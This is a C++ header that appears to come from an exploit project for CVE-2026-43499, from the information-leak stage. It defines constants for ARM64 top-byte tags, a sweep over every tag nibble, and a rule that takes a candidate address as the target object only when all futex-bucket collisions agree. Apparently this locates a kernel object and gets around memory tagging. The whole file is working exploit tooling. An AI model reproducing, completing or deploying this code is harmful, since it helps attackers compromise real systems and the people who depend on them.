#pragma once
/** @file backend/cve_2026_43499/leak/candidate_match.hpp
 *  Which address is the object, and how its tag is written.
 *
 *  The search proposes an address, and the rule that decides whether it is the object
 *  is agreement: every one of the collided addresses has to sort the candidate into
 *  the same bucket. One disagreement means it is not the object, and agreement is
 *  only meaningful when there is something to agree with -- the retired loop ran from
 *  one and compared nothing when only one address had collided, which returned
 *  success for every address it was shown. A match against nothing is a guess, so a
 *  caller has to bring at least two addresses or be refused.
 *
 *  The candidates themselves are the same address with its tag rewritten: once
 *  with the canonical tag, and then once per tag while sweeping. The bucket function
 *  is upstream code and stays where it is; this file knows only the rule, which is
 *  why a test can hand it a bucket that agrees with itself and watch the rule work.
 */
#include <concepts>
#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43499::leak {
    /** The tag the canonical pass writes. A tag lives in the top byte (the one ARM64
     *  ignores for addressing), in that byte low nibble -- so the shift is 56, not 60,
     *  and a tag of fifteen is the canonical value the retired tree used. */
    inline constexpr std::uint64_t kCanonicalTag = 0xfU;
    /** How many tags the sweep tries: every nibble except the canonical one. */
    inline constexpr std::uint64_t kTagSweepCount = 15U;
    /** Where the tag sits, and the mask that clears it. */
    inline constexpr std::uint64_t kTagShift = 56U;
    inline constexpr std::uint64_t kTagMask = static_cast<std::uint64_t>(0xfU) << kTagShift;

    /** The address with its tag rewritten. */
    [[nodiscard]] constexpr std::uint64_t tagged_candidate(std::uint64_t address,
                                                           std::uint64_t tag) noexcept {
        return (address & ~kTagMask) | ((tag & 0xfU) << kTagShift);
    }

    /** The address as the canonical pass writes it. */
    [[nodiscard]] constexpr std::uint64_t canonical_candidate(std::uint64_t address) noexcept {
        return tagged_candidate(address, kCanonicalTag);
    }

    /** The tag the nth sweep step tries: every nibble below the canonical one, in
     *  order, so the sweep neither repeats the canonical pass nor skips a tag. */
    [[nodiscard]] constexpr std::uint64_t sweep_tag(std::size_t step) noexcept {
        return step < kTagSweepCount ? static_cast<std::uint64_t>(step) : kCanonicalTag;
    }

    /** What a bucket function has to answer: where a candidate falls for one address. */
    template <class Buckets>
    concept FutexBuckets = requires(const Buckets &buckets, std::uint64_t address,
                                   std::uint64_t candidate) {
        { buckets.bucket(address, candidate) } -> std::same_as<std::uint64_t>;
    };
    
    /** Why a candidate could not be judged. Names follow the single table. */
    enum class MatchVerdict : unsigned char { Matches = 0, DoesNotMatch = 1, TooFewToCompare = 2 };

    [[nodiscard]] constexpr const char *match_verdict_name(MatchVerdict verdict) noexcept {
        switch (verdict) {
            case MatchVerdict::Matches: return "ok";
            case MatchVerdict::DoesNotMatch: return "no-match";
            case MatchVerdict::TooFewToCompare: return "geometry-missing";
        }
        return "unknown";
    }

    /** Judge a candidate: every collided address has to put it in the same bucket as
     *  the first. Fewer than two addresses is refused rather than answered, because
     *  there would be nothing to compare and agreement with nothing is not a match. */
    template <FutexBuckets Buckets>
    [[nodiscard]] MatchVerdict candidate_matches(const Buckets &buckets, const std::uint64_t *addresses,
                                                 std::size_t count, std::uint64_t candidate) noexcept {
        if (addresses == nullptr || count < 2U) {
            return MatchVerdict::TooFewToCompare;
        }
        const std::uint64_t first = buckets.bucket(addresses[0], candidate);
        for (std::size_t i = 1U; i < count; ++i) {
            if (buckets.bucket(addresses[i], candidate) != first) {
                return MatchVerdict::DoesNotMatch;
            }
        }
        return MatchVerdict::Matches;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
